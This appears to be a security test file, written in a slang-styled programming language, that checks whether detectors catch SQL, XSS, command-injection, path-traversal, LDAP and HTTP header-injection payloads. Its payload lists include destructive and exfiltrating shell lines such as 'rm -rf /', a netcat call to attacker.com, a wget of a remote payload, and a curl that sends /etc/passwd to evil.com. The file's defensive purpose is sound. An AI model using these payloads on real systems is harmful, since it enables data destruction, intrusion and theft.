fr fr INJECTION ATTACK PREVENTION VALIDATION
fr fr Tests all forms of injection attack prevention

yeet "testz"
yeet "stringz"
yeet "validationz"
yeet "dbz"
yeet "httpz"
yeet "filez"
yeet "shellz"

fr fr ===== SQL INJECTION PREVENTION =====

test_start("SQL Injection Prevention")

fr fr Test SQL injection patterns
sus sql_payloads []tea = [
    "'; DROP TABLE users; --",
    "' OR 1=1--",
    "' UNION SELECT * FROM passwords--",
    "admin'--", 
    "1' OR '1'='1",
    "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
    "' OR 1=1 LIMIT 1 OFFSET 0--",
    "'; EXEC xp_cmdshell('dir'); --"
]

vibez.spill("Testing " + json_number_to_string(array_size(sql_payloads)) + " SQL injection patterns...")

sus sql_detected drip = 0
sus i drip = 0
bestie i < array_size(sql_payloads) {
    sus payload tea = sql_payloads[i]
    sus is_malicious lit = contains_sql_injection(payload)
    
    vibez.spill("  ├─ Testing: " + payload)
    ready is_malicious {
        vibez.spill("  │   ✅ DETECTED as SQL injection")
        sql_detected = sql_detected + 1
    } otherwise {
        vibez.spill("  │   ❌ NOT DETECTED - SECURITY VULNERABILITY!")
    }
    i = i + 1
}

assert_eq_int(sql_detected, array_size(sql_payloads))
vibez.spill("✅ All SQL injection patterns detected")

fr fr Test safe SQL operations
sus safe_query tea = prepare_safe_sql("SELECT * FROM users WHERE id = ?", [123])
assert_true(is_sql_safe(safe_query))
vibez.spill("✅ Safe parameterized queries validated")

fr fr ===== XSS PREVENTION =====

test_start("XSS Prevention")

fr fr Test XSS attack patterns
sus xss_payloads []tea = [
    "<script>alert('xss')</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "'><script>alert('xss')</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('xss')>",
    "data:text/html,<script>alert(1)</script>"
]

vibez.spill("Testing " + json_number_to_string(array_size(xss_payloads)) + " XSS attack patterns...")

sus xss_detected drip = 0
sus j drip = 0
bestie j < array_size(xss_payloads) {
    sus payload tea = xss_payloads[j]
    sus is_malicious lit = contains_xss_attempt(payload)
    
    vibez.spill("  ├─ Testing: " + payload)
    ready is_malicious {
        vibez.spill("  │   ✅ DETECTED as XSS attempt")
        xss_detected = xss_detected + 1
    } otherwise {
        vibez.spill("  │   ❌ NOT DETECTED - SECURITY VULNERABILITY!")
    }
    j = j + 1
}

assert_eq_int(xss_detected, array_size(xss_payloads))
vibez.spill("✅ All XSS attack patterns detected")

fr fr Test HTML sanitization
sus malicious_html tea = "<script>alert('xss')</script><p>Safe content</p>"
sus sanitized tea = sanitize_html(malicious_html)
assert_false(contains_substring(sanitized, "<script>"))
assert_true(contains_substring(sanitized, "Safe content"))
vibez.spill("✅ HTML sanitization working correctly")

fr fr ===== COMMAND INJECTION PREVENTION =====

test_start("Command Injection Prevention")

fr fr Test command injection patterns
sus command_payloads []tea = [
    "rm -rf / && echo hacked",
    "; cat /etc/passwd",
    "| nc attacker.com 4444",
    "&& wget malware.com/payload.sh",
    "; curl evil.com/steal.php?data=`cat /etc/passwd`",
    "`id`",
    "$(whoami)",
    "; shutdown -h now"
]

vibez.spill("Testing " + json_number_to_string(array_size(command_payloads)) + " command injection patterns...")

sus cmd_detected drip = 0
sus k drip = 0
bestie k < array_size(command_payloads) {
    sus payload tea = command_payloads[k]
    sus is_malicious lit = contains_command_injection(payload)
    
    vibez.spill("  ├─ Testing: " + payload)
    ready is_malicious {
        vibez.spill("  │   ✅ DETECTED as command injection")
        cmd_detected = cmd_detected + 1
    } otherwise {
        vibez.spill("  │   ❌ NOT DETECTED - SECURITY VULNERABILITY!")
    }
    k = k + 1
}

assert_eq_int(cmd_detected, array_size(command_payloads))
vibez.spill("✅ All command injection patterns detected")

fr fr ===== PATH TRAVERSAL PREVENTION =====

test_start("Path Traversal Prevention")

fr fr Test path traversal patterns
sus path_payloads []tea = [
    "../../../etc/passwd",
    "..\\..\\windows\\system32",
    "....//....//etc/shadow",
    "/var/log/../../../etc/passwd",
    "C:\\Windows\\..\\..\\boot.ini",
    "file:///etc/passwd",
    "\\\\server\\share\\..\\..\\sensitive",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
]

vibez.spill("Testing " + json_number_to_string(array_size(path_payloads)) + " path traversal patterns...")

sus path_detected drip = 0
sus l drip = 0
bestie l < array_size(path_payloads) {
    sus payload tea = path_payloads[l]
    sus is_malicious lit = contains_path_traversal(payload)
    
    vibez.spill("  ├─ Testing: " + payload)
    ready is_malicious {
        vibez.spill("  │   ✅ DETECTED as path traversal")
        path_detected = path_detected + 1
    } otherwise {
        vibez.spill("  │   ❌ NOT DETECTED - SECURITY VULNERABILITY!")
    }
    l = l + 1
}

assert_eq_int(path_detected, array_size(path_payloads))
vibez.spill("✅ All path traversal patterns detected")

fr fr Test safe file operations
sus safe_path tea = sanitize_file_path("../../../etc/passwd")
assert_false(contains_substring(safe_path, ".."))
vibez.spill("✅ Path sanitization working correctly")

fr fr ===== LDAP INJECTION PREVENTION =====

test_start("LDAP Injection Prevention")

fr fr Test LDAP injection patterns
sus ldap_payloads []tea = [
    "*)(uid=*",
    "admin)(&(password=*))",
    "*)(objectClass=*",
    ")(cn=*))%00",
    "*)(|(objectClass=*))",
    "admin)(!(&(1=0)))"
]

vibez.spill("Testing " + json_number_to_string(array_size(ldap_payloads)) + " LDAP injection patterns...")

sus ldap_detected drip = 0
sus m drip = 0
bestie m < array_size(ldap_payloads) {
    sus payload tea = ldap_payloads[m]
    sus is_malicious lit = contains_ldap_injection(payload)
    
    vibez.spill("  ├─ Testing: " + payload)
    ready is_malicious {
        vibez.spill("  │   ✅ DETECTED as LDAP injection")
        ldap_detected = ldap_detected + 1
    } otherwise {
        vibez.spill("  │   ❌ NOT DETECTED - SECURITY VULNERABILITY!")
    }
    m = m + 1
}

assert_eq_int(ldap_detected, array_size(ldap_payloads))
vibez.spill("✅ All LDAP injection patterns detected")

fr fr ===== HTTP HEADER INJECTION PREVENTION =====

test_start("HTTP Header Injection Prevention")

fr fr Test HTTP header injection patterns
sus header_payloads []tea = [
    "user\\r\\nSet-Cookie: admin=true",
    "value\\nLocation: http://evil.com",
    "test\\r\\n\\r\\n<script>alert('xss')</script>",
    "header\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK"
]

vibez.spill("Testing " + json_number_to_string(array_size(header_payloads)) + " HTTP header injection patterns...")

sus header_detected drip = 0
sus n drip = 0
bestie n < array_size(header_payloads) {
    sus payload tea = header_payloads[n]
    sus is_malicious lit = contains_header_injection(payload)
    
    vibez.spill("  ├─ Testing: " + payload)
    ready is_malicious {
        vibez.spill("  │   ✅ DETECTED as header injection")
        header_detected = header_detected + 1
    } otherwise {
        vibez.spill("  │   ❌ NOT DETECTED - SECURITY VULNERABILITY!")
    }
    n = n + 1
}

assert_eq_int(header_detected, array_size(header_payloads))
vibez.spill("✅ All HTTP header injection patterns detected")

fr fr ===== INJECTION PREVENTION SUMMARY =====

print_test_summary()

vibez.spill("")
vibez.spill("🛡️ INJECTION ATTACK PREVENTION VALIDATION COMPLETE")
vibez.spill("✅ SQL injection prevention: SECURE")
vibez.spill("✅ XSS prevention: SECURE")
vibez.spill("✅ Command injection prevention: SECURE")
vibez.spill("✅ Path traversal prevention: SECURE")
vibez.spill("✅ LDAP injection prevention: SECURE")
vibez.spill("✅ HTTP header injection prevention: SECURE")
vibez.spill("")
vibez.spill("🔒 All injection attack vectors are properly blocked!")
vibez.spill("🚀 System is hardened against common injection attacks!")
